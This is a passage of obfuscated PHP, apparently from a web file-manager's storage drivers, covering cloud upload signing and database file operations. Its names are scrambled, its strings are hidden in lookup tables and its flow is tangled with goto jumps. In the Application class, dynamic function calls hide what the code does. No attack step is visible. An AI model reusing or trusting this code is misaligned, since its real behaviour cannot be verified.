($dÅöí‚É£) { return !1; } $a†ø•˜é¼[$Fç–‰Ë›óÇ[1494]] = 0; $a†ø•˜é¼[$Fç–‰Ë›óÇ[1716]] = $this->getSort(); return parent::insert($a†ø•˜é¼); } private function getSort() { $b»¯¯ËŠ¸ =& $_SERVER[Ü˜]; $BÚ¸‹…÷¼ = parent::listData(); $eï¼¹‹¤±† = array_to_keyvalue($BÚ¸‹…÷¼, $b»¯¯ËŠ¸[33], $b»¯¯ËŠ¸[1716]); return empty($eï¼¹‹¤±†) ? 0 : max($eï¼¹‹¤±†) + 1; } public function update($f—ŒÀ¾å¨Ş, $DƒºÎ¢ÂÎ) { $Dàƒæç†’ =& $_SERVER[Ü˜]; $aù‹‡î´òä = $this->listData($f—ŒÀ¾å¨Ş); $CÅ¸œĞøƒ = $this->findByName($DƒºÎ¢ÂÎ[$Dàƒæç†’[28]]); if (!$aù‹‡î´òä || $CÅ¸œĞøƒ && $CÅ¸œĞøƒ[$Dàƒæç†’[402]] != $aù‹‡î´òä[$Dàƒæç†’[402]]) { return !1; } return parent::update($f—ŒÀ¾å¨Ş, $DƒºÎ¢ÂÎ); } public function remove($d³áÅ’Ş¦©, $Dš¥Í¡æ¹ = false) { $A±‚Â‰‘Ã =& $_SERVER[Ü˜]; $e‰æ“öÍ·  = $this->listData($d³áÅ’Ş¦©); if (!$e‰æ“öÍ· ) { return; } if (!$Dš¥Í¡æ¹ && $e‰æ“öÍ· [$A±‚Â‰‘Ã[1172]] == $A±‚Â‰‘Ã[97]) { return !1; } return parent::remove($d³áÅ’Ş¦©); } public function enable($eâä‰ëºâä, $EÖ¡öáÏ‹) { return $this->update($eâä‰ëºâä, array($_SERVER[Ü˜][2103] => $EÖ¡öáÏ‹)); } public function run($Bœî®·íª…) { return $this->update($Bœî®·íª…, array($_SERVER[Ü˜][2113] => time())); } } goto AØÄëÌ±µæ; FÂó˜ÕîËÇ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($d‡Ôˆø‹×) { parent::__construct($d‡Ôˆø‹×); $this->signatureVersion($_SERVER[Ü˜][222]); } public function uploadFormData($E£¦†ˆ·Ó¿, $aÔÃ”òŞ• = 3600) { goto E’ù±¿ßõ¿; E’ù±¿ßõ¿: $fäÄ‚ê‹õò =& $_SERVER[Ü˜]; $b©Í£Ÿ“™Ï = $fäÄ‚ê‹õò[202]; $F±ß•Õ•×º = $fäÄ‚ê‹õò[239]; goto dÓŸÙÌ¨ç¨; dÓŸÙÌ¨ç¨: $e…‰ôß¿ÎÖ = $fäÄ‚ê‹õò[1190]; $DŞËƒ½ğË = gmdate($fäÄ‚ê‹õò[1191], time() + $aÔÃ”òŞ•); $EÚ©Îíµœ¸ = (string) time() . $fäÄ‚ê‹õò[78] . (string) (time() + $aÔÃ”òŞ•); goto cÖøİÆì‚ö; F‰£ÅŠôâ¹: $E¤Ğ“‘œî¢ = sha1($D¼ÎÒî‹»½); $Aá»‹½Ê„Ú = hash_hmac($fäÄ‚ê‹õò[239], $E¤Ğ“‘œî¢, $f˜Ò²‹İíŸ); $d©Û©„Îğ¢ = array($fäÄ‚ê‹õò[1194] => $b©Í£Ÿ“™Ï, $fäÄ‚ê‹õò[1198] => $e…‰ôß¿ÎÖ, $fäÄ‚ê‹õò[1202] => base64_encode($D¼ÎÒî‹»½), $fäÄ‚ê‹õò[1199] => $F±ß•Õ•×º, $fäÄ‚ê‹õò[1200] => $this->accessKey, $fäÄ‚ê‹õò[1203] => $EÚ©Îíµœ¸, $fäÄ‚ê‹õò[1204] => $Aá»‹½Ê„Ú, $fäÄ‚ê‹õò[185] => $this->getHost()); goto EÛæŞµ±“; cÖøİÆì‚ö: $D¼ÎÒî‹»½ = array($fäÄ‚ê‹õò[1192] => $DŞËƒ½ğË, $fäÄ‚ê‹õò[1193] => array(array($fäÄ‚ê‹õò[1194] => $b©Í£Ÿ“™Ï), array($fäÄ‚ê‹õò[1195] => $this->bucket), array($fäÄ‚ê‹õò[1196], $fäÄ‚ê‹õò[1197], $fäÄ‚ê‹õò[33]), array($fäÄ‚ê‹õò[1198] => $e…‰ôß¿ÎÖ), array($fäÄ‚ê‹õò[1199] => $F±ß•Õ•×º), array($fäÄ‚ê‹õò[1200] => $this->accessKey), array($fäÄ‚ê‹õò[1201] => $EÚ©Îíµœ¸))); $D¼ÎÒî‹»½ = json_encode($D¼ÎÒî‹»½); $f˜Ò²‹İíŸ = hash_hmac($fäÄ‚ê‹õò[239], $EÚ©Îíµœ¸, $this->secret); goto F‰£ÅŠôâ¹; EÛæŞµ±“: return $d©Û©„Îğ¢; goto bÃÊŒ³ßİ±; bÃÊŒ³ßİ±: } public function fileOutLink($d©ø¤ğ­ù) { $e“™ÙùÊÂ =& $_SERVER[Ü˜]; if (substr($d©ø¤ğ­ù, 0, 7) == $e“™ÙùÊÂ[1205]) { $d©ø¤ğ­ù = $e“™ÙùÊÂ[1206] . substr($d©ø¤ğ­ù, 7); } header($e“™ÙùÊÂ[169] . $d©ø¤ğ­ù); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($fÈïÃ‡¨Ü¿) { $this->pathParse = $fÈïÃ‡¨Ü¿; $this->model = Model($_SERVER[Ü˜][1207]); } public function getPath($fƒÁéÚÉÀË) { return trim($fƒÁéÚÉÀË, $_SERVER[Ü˜][8]); } public function pathFather($CÔ¨¬µö”Å) { $C‹èÂ·Á­À = $this->parse($CÔ¨¬µö”Å); $C‹èÂ·Á­À = $this->infoSimple($CÔ¨¬µö”Å); return $C‹èÂ·Á­À ? $C‹èÂ·Á­À[$_SERVER[Ü˜][487]] : !1; } public function pathThis($F—‚ÛÌĞ±) { $DÖ’ç†ô›â = $this->infoSimple($F—‚ÛÌĞ±); return $DÖ’ç†ô›â ? $DÖ’ç†ô›â[$_SERVER[Ü˜][28]] : !1; } public function getPathOuter($eºÉŸóº¦Ò) { if (!$eºÉŸóº¦Ò) { return $eºÉŸóº¦Ò; } $c«»…²Üù = $this->parse($eºÉŸóº¦Ò); return KodIO::make($c«»…²Üù[$_SERVER[Ü˜][402]]); } public function copyFolderFromIO($DğÜÇÌ©æí, $D£ÍÂ³˜§, $eƒ•†ÀÖ, $eŠ¬Ù¡ë‹È, $aâÃ†ÄŞ¡) { $b‡„Šæ£× = $this->model->copyFolderFromIO($DğÜÇÌ©æí, $D£ÍÂ³˜§, $eƒ•†ÀÖ, $eŠ¬Ù¡ë‹È, $aâÃ†ÄŞ¡); return KodIO::make($b‡„Šæ£×); } public function isParentOf($dÊ¼ÄŸİ”, $f¡¥”â§²) { return $this->model->isParentOf($dÊ¼ÄŸİ”, $f¡¥”â§²); } public function mkfile($fô¨ê»Äí, $C³™Ğ±àù = '', $aå‚Œ¢’¸— = REPEAT_RENAME) { $Eäƒ¬£çŠ« =& $_SERVER[Ü˜]; $d‘¶õ†¨Ò = $this->parse($fô¨ê»Äí); $fô¨ê»Äí = $d‘¶õ†¨Ò[$Eäƒ¬£çŠ«[402]]; for ($F™ƒƒ½ÛÂ· = 0; $F™ƒƒ½ÛÂ· < count($d‘¶õ†¨Ò[$Eäƒ¬£çŠ«[1208]]); $F™ƒƒ½ÛÂ·++) { $bùíï‡ Ö = $d‘¶õ†¨Ò[$Eäƒ¬£çŠ«[1208]][$F™ƒƒ½ÛÂ·]; if ($F™ƒƒ½ÛÂ· == count($d‘¶õ†¨Ò[$Eäƒ¬£çŠ«[1208]]) - 1) { $fô¨ê»Äí = $this->model->mkfile($fô¨ê»Äí, $bùíï‡ Ö, $C³™Ğ±àù, $aå‚Œ¢’¸—); break; } $fô¨ê»Äí = $this->model->mkdir($fô¨ê»Äí, $bùíï‡ Ö, REPEAT_SKIP); } return $this->getPathOuter($fô¨ê»Äí); } public function mkdir($fÖæ²›Ù¨†, $f…‡•¥«À = REPEAT_SKIP) { $DÖŞ‘¿¡îä =& $_SERVER[Ü˜]; $DØ¨µ‚ = $this->parse($fÖæ²›Ù¨†); $fÖæ²›Ù¨† = $DØ¨µ‚[$DÖŞ‘¿¡îä[402]]; for ($f¤¶àäŞÜæ = 0; $f¤¶àäŞÜæ < count($DØ¨µ‚[$DÖŞ‘¿¡îä[1208]]); $f¤¶àäŞÜæ++) { $BİÖÙ‘ëŒò = $DØ¨µ‚[$DÖŞ‘¿¡îä[1208]][$f¤¶àäŞÜæ]; $fÖæ²›Ù¨† = $this->model->mkdir($fÖæ²›Ù¨†, $BİÖÙ‘ëŒò, $f…‡•¥«À); } return $this->getPathOuter($fÖæ²›Ù¨†); } public function copyFile($A®ÑÂ«„Ô , $dâ«Ç„á“Á, $b•™›œŒ² = REPEAT_REPLACE) { $c‚®ÓÖ¾È =& $_SERVER[Ü˜]; $B§Šä¨‰Ûù = $this->parse($dâ«Ç„á“Á); $fÓ‰ó½²¤Õ = $this->model->copy($A®ÑÂ«„Ô , $B§Šä¨‰Ûù[$c‚®ÓÖ¾È[402]], $b•™›œŒ², $B§Šä¨‰Ûù[$c‚®ÓÖ¾È[86]]); return $fÓ‰ó½²¤Õ ? $this->getPathOuter($fÓ‰ó½²¤Õ) : !1; } public function moveFile($E´ãÚÙŠÌ‡, $cì½ãÑÉ, $Cœƒ»™ˆà¬ = REPEAT_REPLACE) { $eÈ¢ÖÚçò =& $_SERVER[Ü˜]; $fÂ£Õ‹çÏÕ = $this->parse($cì½ãÑÉ); $d‹íÄ„Ë‹› = $this->model->move($E´ãÚÙŠÌ‡, $fÂ£Õ‹çÏÕ[$eÈ¢ÖÚçò[402]], $Cœƒ»™ˆà¬, $fÂ£Õ‹çÏÕ[$eÈ¢ÖÚçò[86]]); return $d‹íÄ„Ë‹› ? $this->getPathOuter($d‹íÄ„Ë‹›) : !1; } public function copy($F´»ïˆ‹ˆ‡, $FÛ„‚ˆƒÓ¯, $EÇ¨‹ÇÇ«‰ = REPEAT_REPLACE) { $C›¡¢“–›å = $this->parse($FÛ„‚ˆƒÓ¯); $B‰Š„£ùÂ¹ = $this->model->copy($F´»ïˆ‹ˆ‡, $C›¡¢“–›å[$_SERVER[Ü˜][402]], $EÇ¨‹ÇÇ«‰); return $B‰Š„£ùÂ¹ ? $this->getPathOuter($B‰Š„£ùÂ¹) : !1; } public function moveSameAllow() { } public function move($CºÙ‘èî¦, $céŸÜÆ¶³, $b‰‰» ä‡ = REPEAT_REPLACE) { $Bàµà’Î¼ƒ = $this->parse($céŸÜÆ¶³); $dÆöŸï©ø = $this->model->move($CºÙ‘èî¦, $Bàµà’Î¼ƒ[$_SERVER[Ü˜][402]], $b‰‰» ä‡); return $dÆöŸï©ø ? $this->getPathOuter($dÆöŸï©ø) : !1; } public function remove($eĞì¥çÎİÜ, $cœ´¥¢Ğ¨µ = true) { return $this->model->remove($eĞì¥çÎİÜ, $cœ´¥¢Ğ¨µ); } public function rename($f÷Ş™¾ÏÂò, $B¹õŒ±¶·Ó) { $Eİ„›©Û = $this->model->rename($f÷Ş™¾ÏÂò, $B¹õŒ±¶·Ó); return $Eİ„›©Û ? $this->getPathOuter($f÷Ş™¾ÏÂò) : $Eİ„›©Û; } public function size($AÁ³œ›–¹) { $f¾³Ñê½ = $this->infoSimple($AÁ³œ›–¹); return $f¾³Ñê½ ? $f¾³Ñê½[$_SERVER[Ü˜][88]] : 0; } public function infoSimple($F¯¯  ¾) { return $this->model->sourceInfo($F¯¯  ¾); } public function info($F¿ªì—†œâ) { return $this->infoParse($F¿ªì—†œâ); } public function infoAuth($e®ì²³–‹°) { return $this->infoParse($e®ì²³–‹°, !1, !0); } public function infoWithChildren($d¸šãÛíæÜ) { return $this->infoParse($d¸šãÛíæÜ, !0); } protected function infoParse($dã»¼”œ°, $fÀøããù±ï = false, $e„Æª†ÜÆ = false) { if (!$fÀøããù±ï) { return $this->model->pathInfo($dã»¼”œ°, $e„Æª†ÜÆ); } return $this->model->pathInfoMore($dã»¼”œ°); } public function infoFull($EêÁ°ÅğÜ¯) { $cØòòğ·ÌÜ =& $_SERVER[Ü˜]; $d¹ÀÍÏÛŠ = explode($cØòòğ·ÌÜ[8], $EêÁ°ÅğÜ¯); $b·Û°¨Õ = implode($cØòòğ·ÌÜ[8], array_splice($d¹ÀÍÏÛŠ, 1)); return $this->model->pathInfoByPath($d¹ÀÍÏÛŠ[0], $b·Û°¨Õ); } public function hashSimple($cØ®ƒŠÊ§Ù) { $AÓÔ‹¼ =& $_SERVER[Ü˜]; $f‚•ì›ŞéÏ = $this->infoWithChildren($cØ®ƒŠÊ§Ù); return $f‚•ì›ŞéÏ[$AÓÔ‹¼[174]][$AÓÔ‹¼[181]]; } public function hashMd5($DÈª³Ó¥ïŒ) { $fõÍ÷ã¡è¯ =& $_SERVER[Ü˜]; $eğ™–‡Ì× = $this->infoWithChildren($DÈª³Ó¥ïŒ); return $eğ™–‡Ì×[$fõÍ÷ã¡è¯[174]][$fõÍ÷ã¡è¯[180]]; } public function exist($Cµ”âÈš¼) { $Eİäœ×ôƒ =& $_SERVER[Ü˜]; $Bµ¾ÖÎ’Œº = $this->parse($Cµ”âÈš¼); if (!$Bµ¾ÖÎ’Œº[$Eİäœ×ôƒ[86]]) { return $this->isFile($Cµ”âÈš¼) || $this->isFolder($Cµ”âÈš¼); } $BÄ¼¹Ÿ™ç‘ = array($Eİäœ×ôƒ[403] => $Bµ¾ÖÎ’Œº[$Eİäœ×ôƒ[402]], $Eİäœ×ôƒ[28] => $Bµ¾ÖÎ’Œº[$Eİäœ×ôƒ[86]]); $bÏğŒ¹¶ƒø = $this->model->where($BÄ¼¹Ÿ™ç‘)->find(); return $bÏğŒ¹¶ƒø ? !0 : !1; } public function isFile($CªÆ“º½—†) { $DÑ¹„‹»ø =& $_SERVER[Ü˜]; $eé²±º¬ñ› = $this->infoSimple($CªÆ“º½—†); return $eé²±º¬ñ› && $eé²±º¬ñ›[$DÑ¹„‹»ø[412]] == $DÑ¹„‹»ø[97] ? !1 : !0; } public function isFolder($aùÄÈœª„¾) { $d®Éô©â” =& $_SERVER[Ü˜]; $FÍ¤âíòİ— = $this->infoSimple($aùÄÈœª„¾); return $FÍ¤âíòİ— && $FÍ¤âíòİ—[$d®Éô©â”[412]] == $d®Éô©â”[97] ? !0 : !1; } public function listPath($a§¤Õù…¤ã, $Bœ¥÷èëª¬ = false) { $F…É¬àà³• =& $_SERVER[Ü˜]; if ($a§¤Õù…¤ã == $F…É¬àà³•[33]) { return !1; } $cÈâğ¤—’® = array($F…É¬àà³•[403] => $a§¤Õù…¤ã); if ($Bœ¥÷èëª¬) { return $this->model->listSource($cÈâğ¤—’®, -1); } return $this->model->listSource($cÈâğ¤—’®); } public function has($Aîù“‹²ïš, $BÇ‹¡“± = false, $Bèõƒ„¬° = null) { $D¼Ï†¹¾´¡ =& $_SERVER[Ü˜]; $AİÀ¹õ¡Šğ = $this->infoWithChildren($Aîù“‹²ïš); if ($BÇ‹¡“±) { return array($D¼Ï†¹¾´¡[214] => $AİÀ¹õ¡Šğ[$D¼Ï†¹¾´¡[214]], $D¼Ï†¹¾´¡[213] => $AİÀ¹õ¡Šğ[$D¼Ï†¹¾´¡[213]]); } return $Bèõƒ„¬° ? $AİÀ¹õ¡Šğ[$D¼Ï†¹¾´¡[214]] : $AİÀ¹õ¡Šğ[$D¼Ï†¹¾´¡[213]]; } public function listAll($b¼ìé˜’£) { $f­ˆ³ÃÈ¤Ê = IO::info($this->pathParse[$_SERVER[Ü˜][86]]); if (!$f­ˆ³ÃÈ¤Ê) { return array(); } return $this->model->listAll($b¼ìé˜’£); } public function getContent($b“×„»ƒ—) { return $this->model->getContent($b“×„»ƒ—); } public function setContent($b­“îƒÇØ, $F²š­¨ßóÔ = '') { return $this->model->setContent($b­“îƒÇØ, $F²š­¨ßóÔ); } public function fileSubstr($e¶í¬êºÏ, $c‰Ê£Í·Ï¬, $EË®Ì‰›æ„) { return $this->model->fileSubstr($e¶í¬êºÏ, $c‰Ê£Í·Ï¬, $EË®Ì‰›æ„); } public function download($Bõ³ÖØ¿º†, $A“˜Àä—Ï¶ = '') { $CÇ¦ÑÖ¹Ò… = get_path_father($A“˜Àä—Ï¶); $FŞ÷Áöëà¨ = get_path_this($A“˜Àä—Ï¶); $eôÊ¨õ¿„é = $this->model->fileInfoGet($Bõ³ÖØ¿º†); $eø‰ä—§É = IO::copy($eôÊ¨õ¿„é[$_SERVER[Ü˜][86]], $CÇ¦ÑÖ¹Ò…, !1, $FŞ÷Áöëà¨); return $eø‰ä—§É; } public function setModifyTime($dãÃ§š´ÙŸ, $e®Î©‚®»ä = '') { $Déš¾ÆŸõ„ =& $_SERVER[Ü˜]; if (!$dãÃ§š´ÙŸ) { return; } $this->model->where(array($Déš¾ÆŸõ„[419] => $dãÃ§š´ÙŸ))->save(array($Déš¾ÆŸõ„[94] => $e®Î©‚®»ä)); } public function upload($F¶‹²•ÆáÛ, $d™‡¬õ–—›, $e¡òŠ¢ö = false, $A÷ÔÆ„àĞé = REPEAT_REPLACE) { $bÊé»•Í“Ò =& $_SERVER[Ü˜]; $E¾å¦ã‡  = $this->parse($F¶‹²•ÆáÛ); $BÙ§îİ¢Û“ = $this->model->addFile($E¾å¦ã‡ [$bÊé»•Í“Ò[402]], $d™‡¬õ–—›, $E¾å¦ã‡ [$bÊé»•Í“Ò[86]], $e¡òŠ¢ö, $A÷ÔÆ„àĞé); return $this->getPathOuter($BÙ§îİ¢Û“); } public function uploadFileByID($eñ÷ì¥ßô„, $dì¢­ïĞ‰ç, $D‰•¾Ü§˜”) { $eØ‹ Ã½“˜ =& $_SERVER[Ü˜]; $a“Ü¹Í³ÛŠ = $this->parse($eñ÷ì¥ßô„); $Dâİí…˜§ = $this->model->addFileByFileID($a“Ü¹Í³ÛŠ[$eØ‹ Ã½“˜[402]], $dì¢­ïĞ‰ç, $a“Ü¹Í³ÛŠ[$eØ‹ Ã½“˜[86]], $D‰•¾Ü§˜”); return $this->getPathOuter($Dâİí…˜§); } public function addFileByRemote($eÈØ‚©Ğ, $Fã½Ç‰»ê‡, $Fí¹Ì‚âÏÌ = array(), $B›×î‹•„í = '', $CÉÚ£¿§¢Æ) { $CìÂ®ÉùŞï =& $_SERVER[Ü˜]; $B§Ì„ëŒù = $this->parse($eÈØ‚©Ğ); $B›×î‹•„í = empty($B›×î‹•„í) ? $B§Ì„ëŒù[$CìÂ®ÉùŞï[86]] : $B›×î‹•„í; $DÖ¤Ù‰¿ = $this->model->addFileByRemote($B§Ì„ëŒù[$CìÂ®ÉùŞï[402]], $Fã½Ç‰»ê‡, $B›×î‹•„í, $Fí¹Ì‚âÏÌ, $CÉÚ£¿§¢Æ); return $this->getPathOuter($DÖ¤Ù‰¿); } public function uploadLink($FÂÉÅŠ”šŸ, $E³Æİš†Ã = 0) { $fŒØêĞ§ĞÛ =& $_SERVER[Ü˜]; $b¶œµ‡½ˆ§ = $this->parse($FÂÉÅŠ”šŸ); $AÑòŞ¶´Ôî = _get($GLOBALS[$fŒØêĞ§ĞÛ[7]], $fŒØêĞ§ĞÛ[1209]); $dïÁè§‘¢ = _get($GLOBALS[$fŒØêĞ§ĞÛ[7]], $fŒØêĞ§ĞÛ[1210]); $FÂÉÅŠ”šŸ = Model($fŒØêĞ§ĞÛ[580])->createFileName($b¶œµ‡½ˆ§[$fŒØêĞ§ĞÛ[86]], $AÑòŞ¶´Ôî, $dïÁè§‘¢); return IO::uploadLink($FÂÉÅŠ”šŸ, $E³Æİš†Ã); } public function fileNameAuto($a‹¹´õ¶©±, $fÆÇÀ­ÖğÈ, $cÂÚÀ§éç = REPEAT_REPLACE, $F´ØÇ¨ƒ›ñ = false) { return $this->model->fileNameAuto($a‹¹´õ¶©±, $fÆÇÀ­ÖğÈ, $cÂÚÀ§éç, $F´ØÇ¨ƒ›ñ); } public function fileNameExist($Cˆôö‹¢¸ø, $bÉŒŸ¼¯£ó) { return $this->model->fileNameExist($Cˆôö‹¢¸ø, $bÉŒŸ¼¯£ó); } protected function _fileOut($B×ÛŒìÔğÏ, $dÎŸ¼±ñòˆ = false, $CƒàÃì¤Ò = false, $Aç—÷—š’„ = '', $D»„¨°—Ã¶ = false) { goto Dµ¬Ò†í­‰; A³œ‹œÂ: $bÀÄĞËÀ = $this->model->fileInfoGet($B×ÛŒìÔğÏ); $Aç—÷—š’„ = $bÀÄĞËÀ[$d‰Ğ°ÎÊõ©[180]] ? $bÀÄĞËÀ[$d‰Ğ°ÎÊõ©[180]] : $Aç—÷—š’„; $Dñ´Î–ä = isset($GLOBALS[$d‰Ğ°ÎÊõ©[1212]]) ? $GLOBALS[$d‰Ğ°ÎÊõ©[1212]] : $FˆÂ‚¥à [$d‰Ğ°ÎÊõ©[28]]; goto EÀƒŠ®ÏÇ‹; EÀƒŠ®ÏÇ‹: if ($D»„¨°—Ã¶) { return IO::fileOutServer($bÀÄĞËÀ[$d‰Ğ°ÎÊõ©[86]], $dÎŸ¼±ñòˆ, $Dñ´Î–ä, $Aç—÷—š’„); } IO::fileOut($bÀÄĞËÀ[$d‰Ğ°ÎÊõ©[86]], $dÎŸ¼±ñòˆ, $Dñ´Î–ä, $Aç—÷—š’„); goto bƒ¬‚×’Ô; Dµ¬Ò†í­‰: $d‰Ğ°ÎÊõ© =& $_SERVER[Ü˜]; $FˆÂ‚¥à  = $this->model->sourceInfo($B×ÛŒìÔğÏ); if ($FˆÂ‚¥à [$d‰Ğ°ÎÊõ©[412]] == $d‰Ğ°ÎÊõ©[97]) { header($d‰Ğ°ÎÊõ©[1211]); die; } goto A³œ‹œÂ; bƒ¬‚×’Ô: } public function fileOut($e­Ÿ”âàÂò, $a å‘å¡Æ¦ = false, $f°•·’Š¿Ü = false, $bäëÍ§†ö = '') { $this->_fileOut($e­Ÿ”âàÂò, $a å‘å¡Æ¦, $f°•·’Š¿Ü, $bäëÍ§†ö); } public function fileOutServer($D†ğ¦ß«ù‚, $Dá…Ş©ËÅ  = false, $A‹Ğ»ÏÖÀ = false, $F˜™®óª‚Ÿ = '') { $this->_fileOut($D†ğ¦ß«ù‚, $Dá…Ş©ËÅ , $A‹Ğ»ÏÖÀ, $F˜™®óª‚Ÿ, !0); } protected function _fileOutImage($bê‡¿³âË, $B™Ã²É´¹Ú = 250) { goto bíË‹¬Æ·Í; F‰©æ»¹¶Ô: $bö‘×á¤‡´ = $this->model->fileInfoGet($bê‡¿³âË); $bö‘×á¤‡´[$a—Şô÷ø©Å[28]] = $DµŸ›ƒå®”[$a—Şô÷ø©Å[28]]; $bö‘×á¤‡´[$a—Şô÷ø©Å[173]] = $DµŸ›ƒå®”[$a—Şô÷ø©Å[173]]; goto Dâá¿íË®õ; Dâá¿íË®õ: $GLOBALS[$a—Şô÷ø©Å[1212]] = $bö‘×á¤‡´[$a—Şô÷ø©Å[28]]; $GLOBALS[$a—Şô÷ø©Å[172]] = $bö‘×á¤‡´; IO::fileOutImage($bö‘×á¤‡´[$a—Şô÷ø©Å[86]], $B™Ã²É´¹Ú); goto a²ï‡õˆ®¶; bíË‹¬Æ·Í: $a—Şô÷ø©Å =& $_SERVER[Ü˜]; $DµŸ›ƒå®” = $this->model->pathInfo($bê‡¿³âË); if ($DµŸ›ƒå®”[$a—Şô÷ø©Å[412]] == $a—Şô÷ø©Å[97]) { show_json($a—Şô÷ø©Å[1213] . $bê‡¿³âË, !1); } goto F‰©æ»¹¶Ô; a²ï‡õˆ®¶: } public function fileOutImage($dÎ±ÓŒºì, $AƒÅŠ‚–ŸÚ = 250) { $this->_fileOutImage($dÎ±ÓŒºì, $AƒÅŠ‚–ŸÚ); } public function fileOutImageServer($B£àì«©¤Á, $E­°‚íÊ¡ = 250) { $this->_fileOutImage($B£àì«©¤Á, $E­°‚íÊ¡); } public function link($aê­‡©î­Ñ, $fÆ…¦¬ó¤è = '') { $AÔ‡è‘–²Ü = $this->model->fileInfoGet($aê­‡©î­Ñ); return IO::link($AÔ‡è‘–²Ü[$_SERVER[Ü˜][86]], $fÆ…¦¬ó¤è); } protected function parse($c¼¿©°Æ×) { $e…ŸªÃÏ² =& $_SERVER[Ü˜]; if (strstr($c¼¿©°Æ×, $e…ŸªÃÏ²[8]) === !1) { return array($e…ŸªÃÏ²[421] => intval($c¼¿©°Æ×), $e…ŸªÃÏ²[86] => $e…ŸªÃÏ²[33], $e…ŸªÃÏ²[1208] => array()); } $B¢²•‘½¤ = explode($e…ŸªÃÏ²[8], trim($c¼¿©°Æ×, $e…ŸªÃÏ²[8])); if (count($B¢²•‘½¤) < 2) { show_tips($c¼¿©°Æ× . $e…ŸªÃÏ²[1214]); } return array($e…ŸªÃÏ²[421] => intval($B¢²•‘½¤[0]), $e…ŸªÃÏ²[86] => $B¢²•‘½¤[1], $e…ŸªÃÏ²[1208] => array_slice($B¢²•‘½¤, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($eó•¾ˆ÷—¨) { $this->pathParse = $eó•¾ˆ÷—¨; $this->model = Model($_SERVER[Ü˜][1207]); } public function getPathOuter($Böùòš¦Üç) { $aÊÃ¨ÎÜÇª =& $_SERVER[Ü˜]; if (!$Böùòš¦Üç) { return $Böùòš¦Üç; } $fˆÃëâÁŒé = $this->parse($Böùòš¦Üç); return trim(KodIO::makeShare($this->pathParse[$aÊÃ¨ÎÜÇª[402]], $fˆÃëâÁŒé[$aÊÃ¨ÎÜÇª[402]]), $aÊÃ¨ÎÜÇª[8]); } protected function infoParse($C¢‡¶©í½š, $dô´ßğšƒ = false, $bİæßÀìä = false) { $A„«ÕÄ’Ùß =& $_SERVER[Ü˜]; $d–ÎàóæÕÔ = $this->pathParse[$A„«ÕÄ’Ùß[402]]; $bÑŒùŸÖ…½ = trim($this->pathParse[$A„«ÕÄ’Ùß[1065]], $A„«ÕÄ’Ùß[8]); return Action($A„«ÕÄ’Ùß[1215])->sharePathInfo($d–ÎàóæÕÔ, $bÑŒùŸÖ…½); } public function infoFull($FÎš˜Î÷®„) { $f•¿¤í¨¦Å =& $_SERVER[Ü˜]; $E’„Ñ… µÀ = explode($f•¿¤í¨¦Å[8], trim($FÎš˜Î÷®„, $f•¿¤í¨¦Å[8])); if (count($E’„Ñ… µÀ) > 1) { $FçæàèñÁ = implode($f•¿¤í¨¦Å[8], array_splice($E’„Ñ… µÀ, 1)); $DÉà‡„ŒÛğ = $this->model->pathInfoByPath($E’„Ñ… µÀ[0], $FçæàèñÁ); if (!$DÉà‡„ŒÛğ) { return !1; } $this->pathParse[$f•¿¤í¨¦Å[1065]] = $DÉà‡„ŒÛğ[$f•¿¤í¨¦Å[404]]; } return $this->infoParse($FÎš˜Î÷®„); } public function listAll($CõÔË—ÎéŠ) { goto E—ÇŞ…š; CæâÍËÜáØ: $bœ–ÏÚ¢Èœ = $this->model->listAll($CõÔË—ÎéŠ); $c±¤½åäÙÎ = Model($EÆôÍ„î¼Ó[572])->getInfo($e‡ëî¸°¾æ[$EÆôÍ„î¼Ó[477]]); $EÉ½ì·‹Ÿ = Action($EÆôÍ„î¼Ó[1215]); goto eï„­’£À; E—ÇŞ…š: $EÆôÍ„î¼Ó =& $_SERVER[Ü˜]; $e‡ëî¸°¾æ = IO::info($this->pathParse[$EÆôÍ„î¼Ó[86]]); if (!$e‡ëî¸°¾æ) { return array(); } goto CæâÍËÜáØ; eï„­’£À: foreach ($bœ–ÏÚ¢Èœ as &$Aø…Å¦‰Û) { check_abort(); $Aø…Å¦‰Û[$EÆôÍ„î¼Ó[95]] = $EÉ½ì·‹Ÿ->_shareItemeParse($Aø…Å¦‰Û[$EÆôÍ„î¼Ó[95]], $c±¤½åäÙÎ); } unset($Aø…Å¦‰Û); return $bœ–ÏÚ¢Èœ; goto f ˜æßÌèƒ; f ˜æßÌèƒ: } } goto dÎá®¯ã¼œ; FŞÍöŸó¼®: $f¼¡Üí§ = $_SERVER[Ü˜][587]; if (!$f¼¡Üí§) { return; } class Application { private $defaultModule = "\151\156\144\145\x78"; private $defaultController = "\x69\x6e\x64\x65\170"; private $defaultAction = "\151\x6e\144\145\170"; function __construct() { } public function setDefault($eÊ½ù³·’¶) { goto A‘ØŞ™Œ¸é; C‡ÑÙß‘: $this->defaultModule = $bôğÒ¤Ú‹ø[0] ? $bôğÒ¤Ú‹ø[0] : $this->defaultModule; $f¡§ÄÔÖ§¥ = $cÎîÛå‘[588]; if (strlen($f¡§ÄÔÖ§¥) < $cÎîÛå‘[589]) { die; } goto fĞ»Ÿ°éÂµ; A‘ØŞ™Œ¸é: $cÎîÛå‘ =& $_SERVER[Ü˜]; $F›†‚ØÑ–Ä =& $_SERVER[’û£ìÂ®Å‚]; $bôğÒ¤Ú‹ø = $F›†‚ØÑ–Ä[0]($F›†‚ØÑ–Ä[1], $F›†‚ØÑ–Ä[2]($eÊ½ù³·’¶, $F›†‚ØÑ–Ä[1])); goto C‡ÑÙß‘; d¾›ªÑ§À: $this->defaultAction = $bôğÒ¤Ú‹ø[2] ? $bôğÒ¤Ú‹ø[2] : $this->defaultAction; $Dİè»áªÍ” = $cÎîÛå‘[591]; if (strlen($Dİè»áªÍ”) < $cÎîÛå‘[64]) { return; } goto BŒÍŒãóÊº; BŒÍŒãóÊº: $this->{$_SERVER[’û£ìÂ®Å‚][3]}($F›†‚ØÑ–Ä[4], array($this, $F›†‚ØÑ–Ä[5])); goto dã˜İêÑñë; fĞ»Ÿ°éÂµ: $this->defaultController = $bôğÒ¤Ú‹ø[1] ? $bôğÒ¤Ú‹ø[1] : $this->defaultController; $d’‹¢¿õ¬ = $cÎîÛå‘[590]; if (!$d’‹¢¿õ¬) { return; } goto d¾›ªÑ§À; dã˜İêÑñë: } public function appRun($a¯¤××µö) { goto c¦ˆö´áÛ; bØ’˜¹»Ş¼: if (strlen($F£Ç¬±öƒÍ) < $eíŒ…ìŸ•Ê[584]) { return; } goto 